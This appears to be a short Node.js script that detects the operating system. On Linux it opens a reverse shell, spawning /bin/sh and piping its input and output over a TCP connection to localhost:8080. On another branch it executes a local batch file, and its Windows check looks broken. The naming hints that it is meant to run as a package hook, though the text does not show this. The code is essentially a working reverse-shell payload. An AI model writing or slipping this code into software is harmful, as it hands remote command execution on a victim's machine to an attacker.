var os = require("os");
const { win32 } = require("path/posix");
var hook = os.platform();
//linux
if (hook === "linux") {
  (function () {
    var net = require("net"),
      cp = require("child_process"),
      sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "localhost", function () {
      client.pipe(sh.stdin);
      sh.stdout.pipe(client);
      sh.stderr.pipe(client);
    });
    return /a/;
  })();
  //win
} else if (hook === win32) {
  require("child_process").exec(
    "/home/souvik/Desktop/test/win.bat/",
    function (err, stdout, stderr) {
      if (err) {
        return console.log(err);
      }
      console.log(stdout);
    }
  );
}
//mac
//openbsd
